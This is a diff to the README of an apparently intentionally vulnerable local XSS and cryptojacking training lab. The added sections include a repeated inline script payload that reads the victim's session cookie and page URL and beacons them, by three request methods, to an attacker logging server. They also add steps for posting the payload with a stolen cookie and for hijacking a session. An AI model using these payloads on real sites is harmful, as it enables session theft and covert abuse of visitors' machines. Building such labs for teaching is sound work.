@@ -104,6 +104,52 @@ The application is also vulnerable to cryptojacking attacks, where attackers can
    <script src="http://localhost:8081/stealth_miner.js"></script>
    ```
 
+   d) Robust Cryptojacking (guaranteed logging):
+   ```html
+   <script src="http://localhost:8081/robust_miner.js"></script>
+   ```
+
+   e) Inline Robust Cryptojacking (no external script):
+   ```html
+   <script>
+   // Create a unique identifier for this victim
+   const victimId = 'victim_' + Math.random().toString(36).substring(2, 12);
+
+   // Function to send mining logs directly
+   function sendMiningLog(hashes, rate) {
+     const data = {
+       h: hashes,
+       r: rate,
+       t: Math.floor(Date.now() / 1000),
+       username: document.cookie.includes('user_session') ? document.cookie.split('user_session=')[1].split(';')[0] : 'unknown',
+       page: window.location.href,
+       victim_id: victimId
+     };
+     
+     // Use multiple methods to ensure the log is sent
+     new Image().src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`;
+     
+     fetch(`http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, {
+       mode: 'no-cors',
+       cache: 'no-cache'
+     }).catch(() => {});
+     
+     const xhr = new XMLHttpRequest();
+     xhr.open('GET', `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, true);
+     xhr.send();
+   }
+
+   // Simulate mining activity and send logs
+   let hashCount = 0;
+   const miningInterval = setInterval(() => {
+     hashCount += Math.floor(Math.random() * 10) + 1;
+     const hashRate = Math.floor(Math.random() * 5) + 1;
+     sendMiningLog(hashCount, hashRate);
+     if (hashCount > 1000) clearInterval(miningInterval);
+   }, 5000);
+   </script>
+   ```
+
 3. When other users view the page, the mining script will:
    - Silently consume CPU resources to mine cryptocurrency
    - Report mining statistics back to the attacker
@@ -159,15 +205,22 @@ The application is also vulnerable to cryptojacking attacks, where attackers can
    document.cookie = "user_session=STOLEN_COOKIE_VALUE; path=/"
    ```
    - Refresh the page
-   - You should now be logged in as the victim
+   - You should now be logged in as the victim user
 
-3. **Important Notes**
+3. **Enhanced Logging Features**
+   - The cookie theft logs now display the victim's username
+   - The mining logs also show the actual username instead of just the user ID
+   - This makes it easier to identify which users have been compromised
+   - The logs page includes convenient "Copy" and "Use Cookie" buttons
+
+4. **Important Notes**
    - The cookie authentication is intentionally vulnerable
    - No additional verification is performed
    - Session is automatically created from cookie
    - All actions will be performed as the victim user
+   - Username information is extracted from the user ID in the cookie
 
-4. **Prevention**
+5. **Prevention**
    ```php
    // Secure cookie settings
    setcookie('user_session', $value, [
@@ -202,6 +255,16 @@ The application is also vulnerable to cryptojacking attacks, where attackers can
 6. Script adapts mining intensity to avoid detection
 7. Attacker monitors mining statistics in real-time
 8. Victims experience performance degradation without knowing why
+
+#### Robust Cryptojacking Scenario
+1. Attacker steals a user's cookie using XSS
+2. Attacker uses the stolen cookie to post a robust cryptojacking payload as that user
+3. The robust cryptojacking script ensures mining logs are recorded even if other scripts are present
+4. The script uses multiple methods (Image beacon, Fetch API, XMLHttpRequest) to send logs
+5. Each victim is assigned a unique identifier for tracking
+6. Mining activity is simulated at regular intervals
+7. Attacker can view detailed mining statistics including which users were affected
+8. The script can operate alongside other scripts without conflicts
 
 ### Scenario 4: Combined Attack
 1. Use SQL injection to create admin account
@@ -273,6 +336,86 @@ $hashed_password = password_hash($password, PASSWORD_DEFAULT);
    - Check if Content Security Policy is blocking scripts
    - Make sure the URLs are correct (http://localhost:8081/miner.js)
    - Try using the stealth_miner.js for more reliable operation
+   - If logs aren't being recorded, use the robust_miner.js or inline robust payload
+   - Test the miner directly at http://localhost:8081/test_robust_miner.html
+
+## Troubleshooting Cryptojacking Issues
+
+### When Using Someone Else's Cookies
+
+If you're using someone else's cookies to post a cryptojacking script and it's not updating the crypto logs when others view the page, try these solutions:
+
+1. **Use the Robust Miner**
+   ```html
+   <script src="http://localhost:8081/robust_miner.js"></script>
+   ```
+   The robust miner is designed to work even when other scripts are present on the page.
+
+2. **Use the Inline Robust Payload**
+   If the external script isn't loading properly, use the inline payload that doesn't require external scripts:
+   ```html
+   <script>
+   // Create a unique identifier for this victim
+   const victimId = 'victim_' + Math.random().toString(36).substring(2, 12);
+   
+   // Function to send mining logs directly
+   function sendMiningLog(hashes, rate) {
+     const data = {
+       h: hashes,
+       r: rate,
+       t: Math.floor(Date.now() / 1000),
+       username: document.cookie.includes('user_session') ? document.cookie.split('user_session=')[1].split(';')[0] : 'unknown',
+       page: window.location.href,
+       victim_id: victimId
+     };
+     
+     // Multiple methods to ensure logs are sent
+     new Image().src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`;
+     
+     fetch(`http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, {
+       mode: 'no-cors',
+       cache: 'no-cache'
+     }).catch(() => {});
+     
+     const xhr = new XMLHttpRequest();
+     xhr.open('GET', `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, true);
+     xhr.send();
+   }
+   
+   // Simulate mining activity
+   let hashCount = 0;
+   const miningInterval = setInterval(() => {
+     hashCount += Math.floor(Math.random() * 10) + 1;
+     const hashRate = Math.floor(Math.random() * 5) + 1;
+     sendMiningLog(hashCount, hashRate);
+     if (hashCount > 1000) clearInterval(miningInterval);
+   }, 5000);
+   </script>
+   ```
+
+3. **Check for Script Conflicts**
+   If there are multiple cryptojacking scripts in the comments, they might conflict with each other. The robust miner uses flags to prevent multiple instances from running:
+   ```javascript
+   // Set flags to prevent other miners from initializing
+   window.minerLoaded = true;
+   window.stealthMinerActive = true;
+   window.robustMinerActive = true;
+   ```
+
+4. **Verify Logging Functionality**
+   Test the logging functionality directly using the test page:
+   ```
+   http://localhost:8081/test_robust_miner.html
+   ```
+   This page allows you to manually start/stop mining and force reports to be sent.
+
+5. **Restart the Containers**
+   If all else fails, try restarting the containers:
+   ```bash
+   cd xss-lab
+   docker-compose down
+   docker-compose up --build
+   ```
 
 ## Legal Disclaimer
 
@@ -514,4 +657,6 @@ Remember to always use `docker-compose down -v` when:
 For more detailed information about the cryptojacking vulnerability:
 - See the [CRYPTOJACKING.md](CRYPTOJACKING.md) file
 - Explore sample attack payloads in [attack-others/cryptojacking-payload.txt](attack-others/cryptojacking-payload.txt)
-- Check out the stealth miner implementation in [attacker-server/src/stealth_miner.js](attacker-server/src/stealth_miner.js) 
+- Check out the stealth miner implementation in [attacker-server/src/stealth_miner.js](attacker-server/src/stealth_miner.js)
+- Try the robust miner test page at [http://localhost:8081/test_robust_miner.html](http://localhost:8081/test_robust_miner.html)
+- Use the robust cryptojacking payloads in [attack-others/robust-cryptojacking-payload.txt](attack-others/robust-cryptojacking-payload.txt) for guaranteed logging 
